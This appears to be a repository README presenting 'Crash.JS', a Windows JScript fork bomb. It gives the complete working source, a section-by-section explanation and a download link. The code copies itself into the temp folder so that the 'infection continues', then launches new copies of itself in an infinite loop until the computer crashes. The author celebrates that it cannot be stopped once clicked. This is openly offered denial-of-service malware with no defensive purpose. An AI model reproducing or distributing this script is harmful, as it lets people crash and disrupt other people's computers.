## Preface

`Crash.JS` is a `JScript` file that [crashes](<https://en.wikipedia.org/wiki/Crash_(computing)>) any PC in a matter of seconds. It renders the target computer slow, then unresponsive, and continues until it simply crashes. The way it works is very simple: it runs copies of itself in a loop as quick as it can, which means that processes are started [exponentially](https://www.dictionary.com/browse/exponentially) more quickly every second. No PC can handle that much stress, and so after a small amount of time, it just gives up. If you would like to download it for yourself, just [click here](./Crash.js)!

## How it works

#code

Here is the whole code ran by the program:

```javascript
var fso = new ActiveXObject('Scripting.FileSystemObject');
var wsh = new ActiveXObject('WScript.Shell');

if (WScript.Arguments.length == 0) {
  fso.CopyFile(WScript.ScriptFullName, fso.GetSpecialFolder(2) + '\\');
  wsh.Run(fso.GetSpecialFolder(2) + '\\' + WScript.ScriptName + ' 1');
} else while (true) wsh.Run(WScript.ScriptFullName + ' 1');
```

It is divided into 3 major parts. The first one is the following:

```javascript
var fso = new ActiveXObject('Scripting.FileSystemObject');
var wsh = new ActiveXObject('WScript.Shell');
```

All this does is it initializes two variables (`fso` and `wsh`) for later use, so it is not that important. After that, the second part of the program gets run. Here it is:

```javascript
if (WScript.Arguments.length == 0) {
  fso.CopyFile(WScript.ScriptFullName, fso.GetSpecialFolder(2) + '\\');
  wsh.Run(fso.GetSpecialFolder(2) + '\\' + WScript.ScriptName + ' 1');
}
```

The job of this part is to make a copy of the program in a [temporary directory](https://en.wikipedia.org/wiki/Temporary_folder), so that if the original gets deleted, the infection continues. It has a very important statement in it: `if(WScript.Arguments.length == 0)`. This statement makes sure that the program was run by the user, so it only makes a copy of itself when you run it for the first time. Then, once a copy has been made, the third part of the program executes. It consists of the following:

```javascript
else while(true) wsh.Run(WScript.ScriptFullName + ' 1');
```

The key of this part is the `while(true)` section: it is used to execute the next statement in an infinite loop... and it turns out that the next statement runs the program again, but in a separate process. This is the part that actually crashes the computer, because the more [instances](<https://en.wikipedia.org/wiki/Instance_(computer_science)>) of this program are running, the more [instances](<https://en.wikipedia.org/wiki/Instance_(computer_science)>) will be created!

## Final Words

In my opinion, this is an very simple, but extremely effective little piece of software. However, some people may argue:

> Sure, but very powerful computers will take hours to even start to slow down!

And this is a fair point, except it's not. Powerful computers usually take even less time to come to a [halt](<https://en.wikipedia.org/wiki/Crash_(computing)>) for the simple reason that they can execute the program's code way faster, which also [crashes](<https://en.wikipedia.org/wiki/Crash_(computing)>) the computer quicker. This program is awesome because there is no way to stop it: once someone clicks on it, it's already too late!
